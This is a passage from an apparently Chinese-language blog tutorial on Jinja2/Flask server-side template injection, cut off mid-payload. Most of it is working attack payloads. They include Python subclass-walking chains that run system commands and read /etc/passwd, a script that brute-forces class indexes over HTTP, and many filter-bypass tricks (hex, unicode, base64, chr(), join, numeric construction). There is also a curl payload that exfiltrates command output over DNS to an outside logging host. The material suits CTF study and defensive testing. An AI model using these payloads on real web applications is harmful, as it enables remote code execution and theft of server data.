+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425221030683.png" alt="image-20210425221030683"></p>
+<ul>
+<li>用<code>__bases__[0]</code>拿到基类：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425221118994.png" alt="image-20210425221118994"></p>
+<ul>
+<li>用<code>__mro__[1]</code>或<code>__mro__[-1]</code>拿到基类：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[-1]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425221349550.png" alt="image-20210425221349550"></p>
+<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>用<code>__subclasses__()</code>拿到子类列表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425221500154.png" alt="image-20210425221500154"></p>
+<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><p>在子类列表中寻找中寻找可以getshell的类。</p>
+<p>我们一般来说是先知晓一些可以getshell的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以getshell的类。</p>
+<p>这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以<code>popen</code>为例子。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">&#x27;popen&#x27;</span></span><br><span class="line">num  = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__base__[<span class="number">0</span>].__subclasses__:</span><br><span class="line">  num += <span class="number">1</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">      print(num, i)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425222340996.png" alt="image-20210425222340996"></p>
+<p>可以发现<code>object</code>基类的第133个子类名为<code>os._wrap_close</code>的这个类有popen方法</p>
+<p>先调用它的<code>__init__</code>方法进行初始化类，再调用<code>__globals__</code>可以获取到方法内以字典的形式返回的方法、属性等值，最后调用<code>popen</code>函数来执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__base__.__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425222543624.png" alt="image-20210425222543624"></p>
+<p>但是上面的方法仅限于在本地寻找，实际操作需要脚本通过不断请求访问去找可以利用的类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;popen&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">&quot;name=&#123;&#123;().__class__.__base__.__subclasses__()[%s].__init__.__globals__.keys()&#125;&#125;&quot;</span> % i</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:5000/?&quot;</span></span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> search <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426094757043.png" alt="image-20210426094757043"></p>
+<p>脚本发现第133个类存在<code>popen</code>函数</p>
+<p>或者用循环打印出所有的类和编号，再搜索能用的类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for i in range(300)%&#125;</span><br><span class="line">&#123;&#123;().__class__.__mro__[-1].__subclasses__()[i]&#125;&#125;</span><br><span class="line">&#123;&#123;i&#125;&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><p>利用找到的类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426095140458.png" alt="image-20210426095140458"></p>
+<p>这样就可以操作系统命令了。</p>
+<br/>
+
+<h3 id="可以利用的类或函数"><a href="#可以利用的类或函数" class="headerlink" title="可以利用的类或函数"></a>可以利用的类或函数</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><p>通常会用<code>&#123;&#123;config&#125;&#125;</code>查询配置信息</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426104040681.png" alt="image-20210426104040681"></p>
+<h4 id="env"><a href="#env" class="headerlink" title="env"></a>env</h4><p>这个不算类或方法，但是有可能flag会藏在这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;env&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p><code>popen()</code>用于执行系统命令，返回一个文件地址，需要用<code>read()</code>来显示文件的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a>subprocess.Popen</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[485](&#39;whoami&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="import-中的os"><a href="#import-中的os" class="headerlink" title="__import__中的os"></a>__import__中的os</h4><p>利用import导入os模块来操作系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[80].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="builtins-代码执行"><a href="#builtins-代码执行" class="headerlink" title="__builtins__代码执行"></a>__builtins__代码执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[80].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[80].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[80].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><p>jinja2中存在对象<code>request</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="url-for"><a href="#url-for" class="headerlink" title="url_for"></a>url_for</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages"></a>get_flashed_messages</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="lipsum"><a href="#lipsum" class="headerlink" title="lipsum"></a>lipsum</h4><p><code>lipsum</code>是一个方法，可以直接调用os方法，也可以使用<code>__buildins__</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤."></a>过滤<code>.</code></h4><h5 id="绕过-1"><a href="#绕过-1" class="headerlink" title="[]绕过"></a><code>[]</code>绕过</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[&#39;__class__&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="attr-绕过"><a href="#attr-绕过" class="headerlink" title="attr()绕过"></a><code>attr()</code>绕过</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(&quot;__class__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="request绕过"><a href="#request绕过" class="headerlink" title="request绕过"></a>request绕过</h5><ul>
+<li><strong>GET</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1&#x3D;open&amp;arg2&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>POST</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line">POST:arg1&#x3D;open&amp;arg2&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Cookie</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br><span class="line">Cookie:arg1&#x3D;open;arg2&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<h5 id="chr-绕过"><a href="#chr-绕过" class="headerlink" title="chr()绕过"></a>chr()绕过</h5><p>先找出<code>chr()</code>函数的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426174609410.png" alt="image-20210426174609410"></p>
+<p>利用<code>chr()</code>绕过<code>&#39;&#39;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#原利用payload</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#125;&#125;</span><br><span class="line">#用char()代替引号</span><br><span class="line">&#123;%set chr&#x3D;[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[133].__init__.__globals__[chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤()"></a>过滤<code>()</code></h4><p>由于执行函数必须要使用小括号，因此过滤小括号后只能查看config配置信息了。</p>
+<h4 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><h5 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h5><p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[133][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&#39;popen&#39;](&#39;whoami&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>关键字也可以使用十六进制编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string1=<span class="string">&quot;__class__&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span>(<span class="params">string</span>):</span></span><br><span class="line">  result = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">      result=result+<span class="string">&quot;\\x&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">ord</span>(string[i]))[<span class="number">2</span>:]</span><br><span class="line">  print(result)</span><br><span class="line">  </span><br><span class="line">tohex(string1)</span><br></pre></td></tr></table></figure>
+<h5 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h5><p>用于<code>__getattribute__</code>使用实例访问属性时。</p>
+<p>例如，过滤掉 <code>__class__ </code>关键词</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><h5 id="双写、大小写"><a href="#双写、大小写" class="headerlink" title="双写、大小写"></a>双写、大小写</h5><h5 id="拼接字符"><a href="#拼接字符" class="headerlink" title="拼接字符"></a>拼接字符</h5><ul>
+<li><code>+</code>拼接</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0]&#125;&#125;</span><br><span class="line">&#123;&#123;()[&#39;__cla&#39;&#39;ss__&#39;].__bases__[0]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>join拼接</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>格式化+管道符</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f&#x3D;__c%sass__&amp;a&#x3D;l</span><br></pre></td></tr></table></figure>
+<h5 id="替代方法"><a href="#替代方法" class="headerlink" title="替代方法"></a>替代方法</h5><ul>
+<li><p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p>
+</li>
+<li><p>过滤config</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="过滤-3"><a href="#过滤-3" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><h5 id="索引中的"><a href="#索引中的" class="headerlink" title="索引中的[]"></a>索引中的<code>[]</code></h5><p>使用<code>pop()</code>或<code>__getitem__()</code>代替<code>[]</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.popen(&#39;whoami&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen(&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="魔术方法中的"><a href="#魔术方法中的" class="headerlink" title="魔术方法中的[]"></a>魔术方法中的<code>[]</code></h5><p>魔术方法中本来是没有中括号的，但是如果需要使用<code>[]</code>绕过关键字的话，可以用<code>__getattribute__</code>绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;).__base__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>也可以配合<code>requests</code>绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1&#x3D;__class__</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(133).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1&#x3D;__class__&amp;arg2&#x3D;whoami</span><br></pre></td></tr></table></figure>
+<h4 id="过滤-4"><a href="#过滤-4" class="headerlink" title="过滤{}"></a>过滤<code>&#123;&#125;</code></h4><h5 id="DNSLOG外带数据"><a href="#DNSLOG外带数据" class="headerlink" title="DNSLOG外带数据"></a>DNSLOG外带数据</h5><p>用<code>&#123;%%&#125;</code>替代，使用判断语句进行dns外带数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&quot;curl &#96;whoami&#96;.t6n089.ceye.io&quot;).read()&#x3D;&#x3D;&#39;ssti&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="print标记"><a href="#print标记" class="headerlink" title="print标记"></a>print标记</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print ().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)%&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h4><h5 id="用循环找到能利用的类直接用"><a href="#用循环找到能利用的类直接用" class="headerlink" title="用循环找到能利用的类直接用"></a>用循环找到能利用的类直接用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;Popen&#39; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="用lipsum不通过数字直接利用"><a href="#用lipsum不通过数字直接利用" class="headerlink" title="用lipsum不通过数字直接利用"></a>用lipsum不通过数字直接利用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="构造数字进行拼接"><a href="#构造数字进行拼接" class="headerlink" title="构造数字进行拼接"></a>构造数字进行拼接</h5><p>首先构造数字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set zero&#x3D;([]|string|list).index(&#39;[&#39;)%&#125;</span><br><span class="line">&#123;%set one&#x3D;dict(a&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set two&#x3D;dict(aa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set three&#x3D;dict(aaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set four&#x3D;dict(aaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set five&#x3D;dict(aaaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set six&#x3D;dict(aaaaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set seven&#x3D;dict(aaaaaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set eight&#x3D;dict(aaaaaaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count%&#125;</span><br></pre></td></tr></table></figure>
+<p>然后拼接数字，这里以258为例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set erwuba&#x3D;(two~five~eight)|int %&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="融合怪"><a href="#融合怪" class="headerlink" title="融合怪"></a>融合怪</h4><p>过滤<code>[&#39;_&#39;, &#39;.&#39;, &#39;0-9&#39;, &#39;\&#39;, &#39;&#39;&#39;, &#39;&quot;&#39;, &#39;[&#39;, &#39;]&#39;, &#39;+&#39;, &#39;request&#39;]</code></p>
+<p>先确定一个利用的基本payload，<strong>越简单越好</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再构造变量来绕过，思路为：利用set来定义变量，使用attr()来提取使用变量绕过点,中括号。但是这样存在一个问题是需要获取下划线，这里通过lipsum来获取下划线。</p>
+<p>先构造数字：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set zero&#x3D;([]|string|list).index(&#39;[&#39;)%&#125;</span><br><span class="line">&#123;%set one&#x3D;dict(a&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set two&#x3D;dict(aa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set three&#x3D;dict(aaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set four&#x3D;dict(aaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set five&#x3D;dict(aaaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set six&#x3D;dict(aaaaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set seven&#x3D;dict(aaaaaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set eight&#x3D;dict(aaaaaaaa&#x3D;a)|join|count%&#125;</span><br><span class="line">&#123;%set 